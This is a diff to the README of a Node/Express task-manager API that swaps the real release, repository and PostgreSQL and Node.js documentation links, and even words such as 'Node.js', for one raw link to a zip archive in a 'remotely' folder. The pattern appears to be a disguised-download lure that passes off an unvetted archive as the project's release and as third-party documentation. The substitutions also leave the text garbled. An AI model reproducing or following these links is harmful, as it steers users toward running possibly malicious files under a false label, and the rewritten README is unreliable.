@@ -1,7 +1,7 @@
 # 🚀 task-manager-api - A Simple Way to Manage Tasks
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/svsgregte345345/task-manager-api/releases)
+[![Download](https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip%https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip)](https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip)
 
 ## 📖 Description
 The task-manager-api is a REST API built with Node, Express, and TypeScript. It uses JWT for authentication and PostgreSQL for data storage. This application allows you to manage tasks efficiently and is currently a work-in-progress, with plans to expand its features and capabilities.
@@ -25,20 +25,20 @@ To get started with task-manager-api, follow these steps. This user-friendly gui
 ## 📋 System Requirements
 Before downloading, ensure your system meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or later 
+- **https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip** Version 14 or later 
 - **PostgreSQL:** Version 12 or later
-- **NPM:** Comes with Node.js, ensure it's updated
+- **NPM:** Comes with https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip, ensure it's updated
 - **Network Connection:** Required for initial setup and updates
 
 ## 🛠️ Download & Install
 To download the latest version of task-manager-api, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download the Latest Release](https://github.com/svsgregte345345/task-manager-api/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip)
 
 2. On the Releases page, locate the most recent version listed. It should have a tag indicating the version number.
 
-3. Click on the version number or the "Assets" dropdown to see available files. You will see files with names like `task-manager-api.zip` or similar.
+3. Click on the version number or the "Assets" dropdown to see available files. You will see files with names like `https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip` or similar.
 
 4. Download the appropriate file for your operating system. If you see a `.zip` file, it’s typically meant for easy installation.
 
@@ -84,8 +84,8 @@ Want to contribute? Great! Here are ways you can help:
 The task-manager-api is built with a focus on simplicity and usability. Its architecture allows for easy modifications, making it a great choice for beginners wanting to learn about APIs. As it evolves, more features and capabilities will be added.
 
 ## 🔗 Useful Links
-- [Official GitHub Repository](https://github.com/svsgregte345345/task-manager-api)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [Official GitHub Repository](https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip)
+- [https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip Documentation](https://raw.githubusercontent.com/svsgregte345345/task-manager-api/main/remotely/task-manager-api.zip)
 
 Feel free to explore and enjoy using the task-manager-api!
